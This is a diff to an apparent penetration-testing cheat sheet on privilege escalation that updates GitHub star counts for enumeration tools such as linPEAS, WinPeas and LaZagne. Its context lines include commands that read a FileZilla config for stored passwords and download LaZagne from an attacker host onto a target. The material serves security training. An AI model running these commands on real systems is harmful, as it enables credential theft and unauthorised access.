@@ -86,8 +86,8 @@ External tools/services
 
 There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...
 
-* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) <small>(13.9k ⭐ | shell script)</small>
-* [LinEnum](https://github.com/rebootuser/LinEnum) <small>(6.4k ⭐ | shell script | 2020 🪦)</small>
+* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) <small>(14.5k ⭐ | shell script)</small>
+* [LinEnum](https://github.com/rebootuser/LinEnum) <small>(6.6k ⭐ | shell script | 2020 🪦)</small>
 * [traitor](linux/tools/traitor.md)  <small>(6.3k ⭐ | go script compiled to binary | 2022 ☠️)</small>
 * [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) a.k.a. LSE <small>(3.0k ⭐ | shell script)</small>
 * [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) <small>(1.4k ⭐ | python script, 2021 🪦)</small>
@@ -138,8 +138,8 @@ Additional references
 
 There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...
 
-* [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) <small>(13.9k ⭐ | binary | Download and Run `.\winPEASany_ofs.exe`)</small>
-* [wesng](https://github.com/bitsadmin/wesng) <small>(3.8k ⭐ | Work locally from an output file 🙌)</small>
+* [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) <small>(14.5k ⭐ | binary | Download and Run `.\winPEASany_ofs.exe`)</small>
+* [wesng](https://github.com/bitsadmin/wesng) <small>(3.9k ⭐ | Work locally from an output file 🙌)</small>
 * [Seatbelt](https://github.com/GhostPack/Seatbelt) <small>(3.2k ⭐)</small>
 * [PrivescCheck](https://github.com/itm4n/PrivescCheck) <small>(2.4k ⭐ | powershell script)</small>
 * [JAWS](https://github.com/411Hall/JAWS) <small>(1.5k ⭐ | 2020 🪦)</small>
@@ -267,7 +267,7 @@ PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
-You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(8.9k ⭐)</small>.
+You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(9.0k ⭐)</small>.
 
 ```ps
 PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
